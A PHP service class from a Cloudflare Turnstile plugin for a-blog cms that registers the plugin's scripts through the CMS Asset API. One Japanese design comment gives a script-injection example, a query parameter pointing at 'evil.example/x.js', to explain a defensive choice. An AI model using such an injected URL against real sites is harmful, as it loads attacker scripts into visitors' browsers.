<?php

declare(strict_types=1);

namespace Acms\Plugins\Turnstile\Services;

use Acms\Services\Facades\Asset;

/**
 * ウィジェットに要るスクリプト（同梱の turnstile.js と Cloudflare の api.js）を本体の Asset API に登録する
 *
 * 本体が </body> の直前に出力し、自分のサイトのファイル（turnstile.js）には本体のキャッシュ対策（?date=）を付ける。
 * Why not テンプレートに <script> を書いてもらう: turnstile.js を更新してもブラウザに古いファイルが残るため。
 * Why not グローバル変数で URL を渡す: 本体は URL のクエリを Hook で足した変数より優先するため、
 * ?変数名=https://evil.example/x.js のような URL で任意のスクリプトを読み込ませられてしまう。
 */
final class Scripts
{
    public const HANDLE = 'acms-turnstile';

    public const API_HANDLE = 'cloudflare-turnstile-api';

    /**
     * Cloudflare は api.js を自分のサーバーに置かず、この URL から読み込むよう求めている
     */
    public const API_URL = 'https://challenges.cloudflare.com/turnstile/v0/api.js?render=explicit&onload=acmsTurnstileOnload';

    /**
     * 登録するスクリプト（Asset::script() の引数）
     *
     * turnstile.js が api.js の onload で呼ばれる関数を定義するため、api.js を turnstile.js のあとに出す。
     *
     * @param string $dirOffset 本体の DIR_OFFSET（ドキュメントルートからインストール先までのパス）
     * @param string $pluginDir 本体の PLUGIN_DIR（/extension/plugins/）
     * @return list<array{handle: string, src: string, options: array{deps?: list<string>, attrs?: array<string, bool>}}>
     */
    public static function definitions(string $dirOffset, string $pluginDir): array
    {
        $scriptUrl = '/' . $dirOffset . trim($pluginDir, '/') . '/Turnstile/assets/turnstile.js';

        return [
            [
                'handle' => self::HANDLE,
                'src' => $scriptUrl,
                'options' => [],
            ],
            [
                'handle' => self::API_HANDLE,
                'src' => self::API_URL,
                'options' => [
                    'deps' => [self::HANDLE],
                    'attrs' => ['async' => true, 'defer' => true],
                ],
            ],
        ];
    }

    /**
     * 現在のリクエストに登録する。同じページで何度呼んでも1回だけ出力する
     */
    public static function enqueue(): void
    {
        foreach (self::definitions(DIR_OFFSET, PLUGIN_DIR) as $definition) {
            // 同じハンドルを二度登録すると本体が監査ログに NOTICE を残すため、登録済みなら何もしない
            if (Asset::has($definition['handle'])) {
                continue;
            }
            Asset::script($definition['handle'], $definition['src'], $definition['options']);
        }
    }
}
